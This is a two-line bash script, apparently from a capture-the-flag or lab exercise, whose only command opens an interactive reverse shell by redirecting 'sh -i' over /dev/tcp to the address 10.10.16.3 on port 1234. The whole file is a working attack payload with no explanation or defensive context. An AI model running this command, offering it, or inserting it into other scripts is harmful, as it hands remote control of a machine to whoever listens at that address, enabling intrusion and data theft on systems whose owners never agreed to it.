#!/bin/bash

sh -i >& /dev/tcp/10.10.16.3/1234 0>&1
